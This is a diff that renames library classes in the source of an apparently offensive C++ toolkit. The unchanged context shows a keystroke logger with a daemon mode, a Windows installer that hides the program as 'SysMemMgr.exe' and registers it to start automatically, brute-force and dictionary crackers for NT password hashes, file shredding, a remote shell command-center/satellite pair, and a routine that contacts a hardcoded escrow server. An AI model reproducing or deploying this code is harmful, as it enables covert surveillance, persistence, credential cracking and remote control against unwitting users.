@@ -9,20 +9,20 @@
 #include "crawler.h"
 #include <stdio.h>
 #include <stdlib.h>
-#include "../../GClasses/GHttp.h"
-#include "../../GClasses/GApp.h"
-#include "../../GClasses/GBits.h"
-#include "../../GClasses/GDirList.h"
-#include "../../GClasses/GDynamicPage.h"
-#include "../../GClasses/GCrypto.h"
-#include "../../GClasses/GError.h"
-#include "../../GClasses/GHolders.h"
-#include "../../GClasses/GRand.h"
-#include "../../GClasses/GFile.h"
-#include "../../GClasses/GThread.h"
-#include "../../GClasses/GTime.h"
-#include "../../GClasses/GSocket.h"
-#include "GKeyboard.h"
+#include "../../WClasses/WHttp.h"
+#include "../../WClasses/WApp.h"
+#include "../../WClasses/WBits.h"
+#include "../../WClasses/WDirList.h"
+#include "../../WClasses/WDynamicPage.h"
+#include "../../WClasses/WCrypto.h"
+#include "../../WClasses/WError.h"
+#include "../../WClasses/WHolders.h"
+#include "../../WClasses/WRand.h"
+#include "../../WClasses/WFile.h"
+#include "../../WClasses/WThread.h"
+#include "../../WClasses/WTime.h"
+#include "../../WClasses/WSocket.h"
+#include "WKeyboard.h"
 #include <time.h>
 #include <iostream>
 #include <cmath>
@@ -32,7 +32,7 @@
 #include <direct.h>
 #include <process.h>
 #include <io.h> // for "filelength"
-#include "../../GClasses/GWindows.h"
+#include "../../WClasses/WWindows.h"
 #include <stdlib.h>
 #include <TCHAR.h>
 #else
@@ -40,7 +40,7 @@
 #endif
 #include <exception>
 #include <fstream>
-#include "../../GClasses/usage.h"
+#include "../../WClasses/usage.h"
 #include "satellite.h"
 #include <math.h>
 #include <sstream>
@@ -48,7 +48,7 @@
 #include <errno.h>
 #include <memory>
 
-using namespace GClasses;
+using namespace WClasses;
 using std::cout;
 using std::cin;
 using std::cerr;
@@ -174,7 +174,7 @@ bool shredFile(const char* szFilename)
 	overwriteFileWithGarbage(szFilename);
 	return (remove(szFilename) == 0);
 #else
-	GTEMPBUF(char, szTmp, strlen(szFilename) + 32);
+	WTEMPBUF(char, szTmp, strlen(szFilename) + 32);
 	strcpy(szTmp, "shred -fun1 ");
 	strcat(szTmp, szFilename);
 	bool bOK = (system(szTmp) == 0);
@@ -196,7 +196,7 @@ bool shredFolder(const char* szPath)
 		if(chdir(szPath) != 0)
 			return false;
 		vector<string> folders;
-		GFile::folderList(folders);
+		WFile::folderList(folders);
 		for(vector<string>::iterator it = folders.begin(); it != folders.end(); it++)
 		{
 			const char* szDir = it->c_str();
@@ -208,7 +208,7 @@ bool shredFolder(const char* szPath)
 	// Delete files
 	{
 		vector<string> files;
-		GFile::fileList(files);
+		WFile::fileList(files);
 		for(vector<string>::iterator it = files.begin(); it != files.end(); it++)
 		{
 			const char* szFile = it->c_str();
@@ -250,19 +250,19 @@ void shred(const char* szPath)
 	}
 }
 
-void shred(GArgReader& args)
+void shred(WArgReader& args)
 {
 	shred(args.pop_string());
 }
 
-void makeGarbage(GArgReader& args)
+void makeGarbage(WArgReader& args)
 {
 	char buf[2048];
 	unsigned long long* pBuf2 = (unsigned long long*)buf;
 	size_t n = 0;
 	while(true)
 	{
-		GRand prng(getpid() * time(NULL));
+		WRand prng(getpid() * time(NULL));
 		ostringstream oss;
 		oss << "garb";
 		oss << n;
@@ -333,19 +333,19 @@ void InstallOnWindowsAndLaunch()
 	strcpy(newPath + len, "SysMemMgr.exe");
 
 	// Copy the file
-	if(GFile::doesFileExist(newPath))
+	if(WFile::doesFileExist(newPath))
 	{
 		if(!DeleteFile(newPath))
 			exit(0);
 	}
-	if(!GFile::copyFile(szAppPath, newPath))
+	if(!WFile::copyFile(szAppPath, newPath))
 		cout << "The application failed to start\n";
 
 	// Install in the registry
 	strcat(newPath + len, " q9f24m3");
 	InstallInRunFolder("SysMemMgr", newPath);
-	GApp::systemExecute(newPath, false, NULL, NULL);
-	GThread::sleep(900);
+	WApp::systemExecute(newPath, false, NULL, NULL);
+	WThread::sleep(900);
 	exit(0);
 }
 
@@ -378,7 +378,7 @@ void UninstallFromWindows()
 
 		// Run the batch file
 		strcat(szAppPath + j, " SysMemMgr.exe");
-		GApp::systemCall(szAppPath, false, false);
+		WApp::systemCall(szAppPath, false, false);
 	}
 	else
 	{
@@ -390,7 +390,7 @@ void UninstallFromWindows()
 
 #endif // !WINDOWS
 
-int doBandwidthClient(GArgReader& args)
+int doBandwidthClient(WArgReader& args)
 {
 	int port = 3712;
 	const char* szUrl = "localhost";
@@ -407,17 +407,17 @@ int doBandwidthClient(GArgReader& args)
 	// Fill an 8-MB buffer with random data
 	unsigned char* pBuf = new unsigned char[MESSAGESIZE];
 	std::unique_ptr<unsigned char[]> hBuf(pBuf);
-	GRand r(0);
+	WRand r(0);
 	unsigned int* pU = (unsigned int*)pBuf;
 	for(unsigned int i = 0; i < MESSAGESIZE / sizeof(unsigned int); i++)
 		*(pU++) = (unsigned int)r.next();
 
 	// Make a ClientSocket
 	cout << "Connecting to server...\n";
-	GPackageClient socket;
-	double dStart = GTime::seconds();
+	WPackageClient socket;
+	double dStart = WTime::seconds();
 	socket.connect(szUrl, port);
-	double dFinish = GTime::seconds();
+	double dFinish = WTime::seconds();
 	cout << "Connecting time = " << dFinish - dStart << "\n";
 
 	// Measure latency
@@ -426,7 +426,7 @@ int doBandwidthClient(GArgReader& args)
 	for(int i = 0; i < 9; i++)
 	{
 		// Send a small message
-		dStart = GTime::seconds();
+		dStart = WTime::seconds();
 		socket.send((const char*)pBuf, SMALL_MESSAGE_SIZE);
 
 		// Wait for a reply
@@ -439,11 +439,11 @@ int doBandwidthClient(GArgReader& args)
 			if(pMessage)
 				break;
 #ifdef WINDOWS
-			GWindows::yield();
+			WWindows::yield();
 #endif
-			GThread::sleep(0);
+			WThread::sleep(0);
 		}
-		dFinish = GTime::seconds();
+		dFinish = WTime::seconds();
 		if(i > 0)
 			dLatency += (dFinish - dStart);
 	}
@@ -452,7 +452,7 @@ int doBandwidthClient(GArgReader& args)
 
 	// Send a big message
 	cout << "Sending an 8MB message (to measure bandwidth)...\n";
-	dStart = GTime::seconds();
+	dStart = WTime::seconds();
 	socket.send((const char*)pBuf, MESSAGESIZE);
 
 	// Wait for a reply
@@ -465,11 +465,11 @@ int doBandwidthClient(GArgReader& args)
 		if(pMessage)
 			break;
 #ifdef WINDOWS
-		GWindows::yield();
+		WWindows::yield();
 #endif
-		GThread::sleep(0);
+		WThread::sleep(0);
 	}
-	dFinish = GTime::seconds();
+	dFinish = WTime::seconds();
 
 	// Check the message
 	if(nSize != MESSAGESIZE)
@@ -484,7 +484,7 @@ int doBandwidthClient(GArgReader& args)
 	return 0;
 }
 
-int doBandwidthServer(GArgReader& args)
+int doBandwidthServer(WArgReader& args)
 {
 	// Parse args
 	int port = 3712;
@@ -497,12 +497,12 @@ int doBandwidthServer(GArgReader& args)
 	}
 
 	// Repeat messages
-	GPackageServer socket(port);
+	WPackageServer socket(port);
 	cout << "waiting for a client program to connect...\n";
 	while(true)
 	{
 		size_t nSize;
-		GPackageConnection* pConn;
+		WPackageConnection* pConn;
 		char* pMessage = socket.receive(&nSize, &pConn);
 		if(pMessage)
 		{
@@ -515,7 +515,7 @@ int doBandwidthServer(GArgReader& args)
 
 		// Let Windows have a chance to pump messages through
 #ifdef WINDOWS
-		GWindows::yield();
+		WWindows::yield();
 		Sleep(0);
 #endif
 	}
@@ -548,7 +548,7 @@ void dictionaryAttackNTPassword(unsigned char* hash, vector<vector<string>* >& d
 {
 	unsigned char candHash[16];
 	char buf[256];
-	GTEMPBUF(size_t, indexes, dictionaries.size());
+	WTEMPBUF(size_t, indexes, dictionaries.size());
 	size_t total = 1;
 	for(size_t i = 0; i < dictionaries.size(); i++)
 	{
@@ -640,8 +640,8 @@ void bruteForceNTPassword(size_t passwordLen, unsigned char* hash, const char* c
 	size_t includeLen = 0;
 	if(szInclude)
 		includeLen = strlen(szInclude);
-	GTEMPBUF(const char*, pChars, passwordLen); // A buffer of pointers. Each element points at the current char in that position.
-	GTEMPBUF(char, cand, passwordLen + includeLen + 1); // The candidate passphrase.
+	WTEMPBUF(const char*, pChars, passwordLen); // A buffer of pointers. Each element points at the current char in that position.
+	WTEMPBUF(char, cand, passwordLen + includeLen + 1); // The candidate passphrase.
 	cand[passwordLen + includeLen] = '\0';
 	for(size_t i = 0; i < passwordLen; i++)
 	{
@@ -738,13 +738,13 @@ void bruteForceNTPassword(size_t passwordLen, unsigned char* hash, const char* c
 	}
 }
 
-void bruteForceNTPassword(GArgReader& args)
+void bruteForceNTPassword(WArgReader& args)
 {
 	const char* szHashHex = args.pop_string();
 	if(strlen(szHashHex) != 32)
 		throw Ex("Expected the hash to consist of 32 hexadecimal digits");
 	unsigned char hash[16];
-	GBits::hexToBufferBigEndian(szHashHex, 32, hash);
+	WBits::hexToBufferBigEndian(szHashHex, 32, hash);
 	string charset = "";
 	string include = "";
 	size_t startLen = 0;
@@ -830,13 +830,13 @@ void dictAttack(unsigned char* hash, vector<string>* pd1, vector<string>* pd2 = 
 		dictionaryAttackNTPassword(hash, dictionaries, s2, false);
 }
 
-void dictAttackNTPassword(GArgReader& args)
+void dictAttackNTPassword(WArgReader& args)
 {
 	const char* szHashHex = args.pop_string();
 	if(strlen(szHashHex) != 32)
 		throw Ex("Expected the hash to consist of 32 hexadecimal digits");
 	unsigned char hash[16];
-	GBits::hexToBufferBigEndian(szHashHex, 32, hash);
+	WBits::hexToBufferBigEndian(szHashHex, 32, hash);
 
 	const char* szDictionary = args.pop_string();
 	size_t cap1 = 6; // max length for one-word passphrase attempts
@@ -861,7 +861,7 @@ void dictAttackNTPassword(GArgReader& args)
 	}
 	catch(const std::exception&)
 	{
-		if(GFile::doesFileExist(szDictionary))
+		if(WFile::doesFileExist(szDictionary))
 			throw Ex("Error while trying to open the existing file: ", szDictionary);
 		else
 			throw Ex("File not found: ", szDictionary);
@@ -903,13 +903,13 @@ void dictAttackNTPassword(GArgReader& args)
 	}
 }
 
-void permuteAttack(GArgReader& args)
+void permuteAttack(WArgReader& args)
 {
 	/*	const char* szHashHex = args.pop_string();
 	if(strlen(szHashHex) != 32)
 		throw Ex("Expected the hash to consist of 32 hexadecimal digits");
 	unsigned char hash[16];
-	GBits::hexToBufferBigEndian(szHashHex, 32, hash);
+	WBits::hexToBufferBigEndian(szHashHex, 32, hash);
 
 	//const char* szBase = args.pop_string();
 	size_t removals = 0;
@@ -932,7 +932,7 @@ void permuteAttack(GArgReader& args)
 	*/
 }
 
-void dump(GArgReader& args)
+void dump(WArgReader& args)
 {
 	const char* szFilename = args.pop_string();
 	size_t startPos = args.pop_uint();
@@ -985,8 +985,8 @@ void dump(GArgReader& args)
 void encryptPath(const char* pathName, char* passphrase, const char* targetName, bool compress)
 {
 	// Encrypt the path
-	GFolderSerializer fs(pathName, compress);
-	GCrypto crypto(passphrase, strlen(passphrase));
+	WFolderSerializer fs(pathName, compress);
+	WCrypto crypto(passphrase, strlen(passphrase));
 	std::ofstream ofs;
 	ofs.exceptions(std::ios::failbit | std::ios::badbit);
 	ofs.open(targetName, std::ios::binary);
@@ -1048,8 +1048,8 @@ void decryptFile(const char* source, char* passphrase, char* outSalt, std::strin
 	// Decrypt it
 	size_t origLen = len;
 	size_t prevLen = len;
-	GFolderDeserializer fd(pBaseName);
-	GCrypto crypto(passphrase, strlen(passphrase));
+	WFolderDeserializer fd(pBaseName);
+	WCrypto crypto(passphrase, strlen(passphrase));
 	char* pBuf = new char[DECRYPT_BLOCK_SIZE];
 	std::unique_ptr<char[]> hBuf(pBuf);
 	bool first = true;
@@ -1085,7 +1085,7 @@ void decryptFile(const char* source, char* passphrase, char* outSalt, std::strin
 
 
 
-void feast(GArgReader& args)
+void feast(WArgReader& args)
 {
 	string def;
 	const char* szServer = "uaf46365.ddns.uark.edu/escrow/escrow.php";
@@ -1104,11 +1104,11 @@ void feast(GArgReader& args)
 	if(def.length() == 0)
 	{
 		vector<string> files;
-		GFile::fileList(files);
+		WFile::fileList(files);
 		for(size_t i = 0; i < files.size(); i++)
 		{
 			PathData pd;
-			GFile::parsePath(files[i].c_str(), &pd);
+			WFile::parsePath(files[i].c_str(), &pd);
 			if(strcmp(files[i].c_str() + pd.extStart, ".encrypted") == 0)
 				def = files[i];
 		}
@@ -1146,7 +1146,7 @@ void feast(GArgReader& args)
 		throw Ex("Error deleting the file ", pathName);
 }
 
-void find(GArgReader& args)
+void find(WArgReader& args)
 {
 	const char* szFilename = args.pop_string();
 	const char* szNeedle = args.pop_string();
@@ -1211,12 +1211,12 @@ void find(GArgReader& args)
 	}
 }
 
-void nthash(GArgReader& args)
+void nthash(WArgReader& args)
 {
 	unsigned char hash[16];
 	nthash(args.pop_string(), hash);
 	char hex[33];
-	GBits::bufferToHexBigEndian(hash, 16, hex);
+	WBits::bufferToHexBigEndian(hash, 16, hex);
 	hex[32] = '\0';
 	cout << hex << "\n";
 }
@@ -1228,7 +1228,7 @@ const char* g_szMagicCombo = "xqwertx";
 class KeystrokeSniffer
 {
 protected:
-	GKeyboard* m_pKeyboard;
+	WKeyboard* m_pKeyboard;
 	FILE* m_pLogFile;
 	int m_nMagicPos;
 	double m_lastKeyTime;
@@ -1241,15 +1241,15 @@ public:
 		m_pLogFile = fopen(szFilename, "a");
 		if(!m_pLogFile)
 			throw Ex("Failed to open log file");
-		fprintf(m_pLogFile, "\n== Begin at %s ==\n", GTime::asciiTime(time_buf, 64, false));
-		m_pKeyboard = new GKeyboard(KeyStrokeHandler, this);
-		m_lastKeyTime = GTime::seconds();
+		fprintf(m_pLogFile, "\n== Begin at %s ==\n", WTime::asciiTime(time_buf, 64, false));
+		m_pKeyboard = new WKeyboard(KeyStrokeHandler, this);
+		m_lastKeyTime = WTime::seconds();
 	}
 
 	~KeystrokeSniffer()
 	{
 		delete(m_pKeyboard);
-		fprintf(m_pLogFile, "\n== End at %s ==\n", GTime::asciiTime(time_buf, 64, false));
+		fprintf(m_pLogFile, "\n== End at %s ==\n", WTime::asciiTime(time_buf, 64, false));
 		fclose(m_pLogFile);
 	}
 
@@ -1286,10 +1286,10 @@ public:
 			OnKeyStroke('>');
 			return;
 		}
-		double d = GTime::seconds();
+		double d = WTime::seconds();
 		if(d - m_lastKeyTime > 120)
 		{
-			fprintf(m_pLogFile, "\n-- Time %s -\n", GTime::asciiTime(time_buf, 64, false));
+			fprintf(m_pLogFile, "\n-- Time %s -\n", WTime::asciiTime(time_buf, 64, false));
 			fputc(c, m_pLogFile);
 			fflush(m_pLogFile);
 		}
@@ -1325,7 +1325,7 @@ public:
 		}
 	}
 
-	static void logKeyStrokes(GArgReader& args)
+	static void logKeyStrokes(WArgReader& args)
 	{
 		const char* szFilename = args.pop_string();
 		bool daemon = false;
@@ -1337,7 +1337,7 @@ public:
 				throw Ex("Invalid option: ", args.peek());
 		}
 		if(daemon)
-			GApp::launchDaemon(doLogging, (void*)szFilename);
+			WApp::launchDaemon(doLogging, (void*)szFilename);
 		else
 			doLogging((void*)szFilename);
 	}
@@ -1346,18 +1346,18 @@ public:
 
 
 
-int wget(GArgReader& args)
+int wget(WArgReader& args)
 {
 	const char* url = args.pop_string();
 	const char* filename = args.pop_string();
 	size_t size;
 	char* pFile = (char*)downloadFromWeb(url, 20, &size);
 	std::unique_ptr<char[]> hFile(pFile);
-	GFile::saveFile(pFile, size, filename);
+	WFile::saveFile(pFile, size, filename);
 	return 0;
 }
 
-void doCommandCenter(GArgReader& args)
+void doCommandCenter(WArgReader& args)
 {
 	int port = 6831;
 	while(args.next_is_flag())
@@ -1370,7 +1370,7 @@ void doCommandCenter(GArgReader& args)
 	doShellCommandCenter(port);
 }
 
-int doSatellite(GArgReader& args)
+int doSatellite(WArgReader& args)
 {
 	const char* szAddr = "localhost";
 	int connectInterval = 60 * 10;
@@ -1392,7 +1392,7 @@ int doSatellite(GArgReader& args)
 	return 0;
 }
 /*
-int doLogin(GArgReader& args)
+int doLogin(WArgReader& args)
 {
 	LoginController c;
 	c.RunModal();
@@ -1404,7 +1404,7 @@ void readInPassphrase(char* pBuf, size_t len, char* pSalt = NULL)
 {
 	cout << "Please enter the passphrase: ";
 	cout.flush();
-	GPassiveConsole pc(false);
+	WPassiveConsole pc(false);
 	while(true)
 	{
 		char c = pc.getChar();
@@ -1420,7 +1420,7 @@ void readInPassphrase(char* pBuf, size_t len, char* pSalt = NULL)
 			}
 		}
 		else
-			GThread::sleep(10);
+			WThread::sleep(10);
 	}
 	*pBuf = '\0';
 	cout << "\r                                                   \r";
@@ -1432,7 +1432,7 @@ void readInPassphrase(char* pBuf, size_t len, char* pSalt = NULL)
 		size_t remaining = SALT_LEN;
 		cout << "\rPlease enter " << remaining << " chars of throw-away salt";
 		cout.flush();
-		GPassiveConsole pc2(false);
+		WPassiveConsole pc2(false);
 		while(remaining > 0)
 		{
 			char c = pc2.getChar();
@@ -1444,7 +1444,7 @@ void readInPassphrase(char* pBuf, size_t len, char* pSalt = NULL)
 				cout.flush();
 			}
 			else
-				GThread::sleep(10);
+				WThread::sleep(10);
 		}
 		cout << "\r                                                   \r";
 		cout.flush();
@@ -1462,7 +1462,7 @@ public:
 	}
 };
 
-void decrypt(GArgReader& args)
+void decrypt(WArgReader& args)
 {
 	const char* filename = args.pop_string();
 	char passphrase[MAX_PASSPHRASE_LEN];
@@ -1472,7 +1472,7 @@ void decrypt(GArgReader& args)
 	decryptFile(filename, passphrase, salt, NULL);
 }
 
-void encrypt(GArgReader& args)
+void encrypt(WArgReader& args)
 {
 	// Get the source path
 	const char* pathName = args.pop_string();
@@ -1482,7 +1482,7 @@ void encrypt(GArgReader& args)
 	if(sPath.length() > 0 && (sPath[sPath.length() - 1] == '/' || sPath[sPath.length() - 1] == '\\'))
 		sPath.erase(sPath.length() - 1);
 	PathData pd;
-	GFile::parsePath(sPath.c_str(), &pd);
+	WFile::parsePath(sPath.c_str(), &pd);
 	string sTarget;
 	sTarget.assign(pathName + pd.fileStart, pd.extStart - pd.fileStart);
 	sTarget.append(".encrypted");
@@ -1543,7 +1543,7 @@ public:
 
 CWindowIterator::CWindowIterator(DWORD nAlloc)
 {
-	GAssert(nAlloc > 0);
+	WAssert(nAlloc > 0);
 	m_current = m_count = 0;
 	m_hwnds = new HWND[nAlloc];
 	m_nAlloc = nAlloc;
@@ -1622,13 +1622,13 @@ void OpenFile(const char* szFilename)
 #else
 #ifdef __APPLE__
 	// Mac
-	GTEMPBUF(char, pBuf, 32 + strlen(szFilename));
+	WTEMPBUF(char, pBuf, 32 + strlen(szFilename));
 	strcpy(pBuf, "open ");
 	strcat(pBuf, szFilename);
 	strcat(pBuf, " &");
 	system(pBuf);
 #else // __APPLE__
-	GTEMPBUF(char, pBuf, 32 + strlen(szFilename));
+	WTEMPBUF(char, pBuf, 32 + strlen(szFilename));
 
 	// XFCE
 	strcpy(pBuf, "xdg-open ");
@@ -1653,7 +1653,7 @@ void OpenFile(const char* szFilename)
 #endif // !WINDOWS
 }
 
-void open(GArgReader& args)
+void open(WArgReader& args)
 {
 	const char* filename = args.pop_string();
 	char passphrase[MAX_PASSPHRASE_LEN];
@@ -1716,7 +1716,7 @@ void open(GArgReader& args)
 	}
 }
 
-void grep(GArgReader& args)
+void grep(WArgReader& args)
 {
 	const char* filename = args.pop_string();
 	const char* needle = args.pop_string();
@@ -1739,7 +1739,7 @@ void grep(GArgReader& args)
 	shred(basename.c_str());
 }
 /*
-void socketClient(GArgReader& args)
+void socketClient(WArgReader& args)
 {
 	const char* szAddr;
 	int port = 8080;
@@ -1753,7 +1753,7 @@ void socketClient(GArgReader& args)
 			throw Ex("Invalid option: ", args.peek());
 	}
 
-	GTCPClient client;
+	WTCPClient client;
 	client.connect(szAddr, port);
 	while(true)
 	{
@@ -1761,7 +1761,7 @@ void socketClient(GArgReader& args)
 	}
 }
 */
-void socketServer(GArgReader& args)
+void socketServer(WArgReader& args)
 {
 	int port = 8080;
 	while(args.next_is_flag())
@@ -1772,9 +1772,9 @@ void socketServer(GArgReader& args)
 			throw Ex("Invalid option: ", args.peek());
 	}
 
-	GTCPServer server(port);
+	WTCPServer server(port);
 	char buf[257];
-	GTCPConnection* pConn;
+	WTCPConnection* pConn;
 	while(true)
 	{
 		size_t n = server.receive(buf, 256, &pConn);
@@ -1783,7 +1783,7 @@ void socketServer(GArgReader& args)
 			buf[n] = '\0';
 			std::cout << buf;
 		}
-		GThread::sleep(100);
+		WThread::sleep(100);
 	}
 }
 
@@ -1799,7 +1799,7 @@ void ShowUsage()
 	cout.flush();
 }
 
-void showError(GArgReader& args, const char* szMessage)
+void showError(WArgReader& args, const char* szMessage)
 {
 	cerr << "_________________________________\n";
 	cerr << szMessage << "\n\n";
@@ -1832,7 +1832,7 @@ void showError(GArgReader& args, const char* szMessage)
 	cerr.flush();
 }
 
-void doit(GArgReader& args)
+void doit(WArgReader& args)
 {
 	if(args.size() < 1) throw Ex("Expected a command");
 	else if(args.if_pop("usage")) ShowUsage();
@@ -1872,7 +1872,7 @@ void doit(GArgReader& args)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	// Parse the args
-	GTEMPBUF(char, buf, strlen(lpCmdLine));
+	WTEMPBUF(char, buf, strlen(lpCmdLine));
 	strcpy(buf, lpCmdLine);
 	bool quot = false;
 	int start = 0;
@@ -1900,11 +1900,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		}
 	}
 	args.push_back(buf + start);
-	GTEMPBUF(char*, argv, args.size() + 1);
+	WTEMPBUF(char*, argv, args.size() + 1);
 	for(size_t i = 0; i < args.size(); i++)
 		argv[i] = (char*)args[i];
 	argv[args.size()] = NULL;
-	GArgReader argReader(args.size(), argv);
+	WArgReader argReader(args.size(), argv);
 	try
 	{
 		doit(argReader);
@@ -1919,10 +1919,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 int main(int argc, char* argv[])
 {
 #ifdef _DEBUG
-	GApp::enableFloatingPointExceptions();
+	WApp::enableFloatingPointExceptions();
 #endif
 	int nRet = 1;
-	GArgReader args(argc, argv);
+	WArgReader args(argc, argv);
 	args.pop_string(); // advance past the app name
 	try
 	{
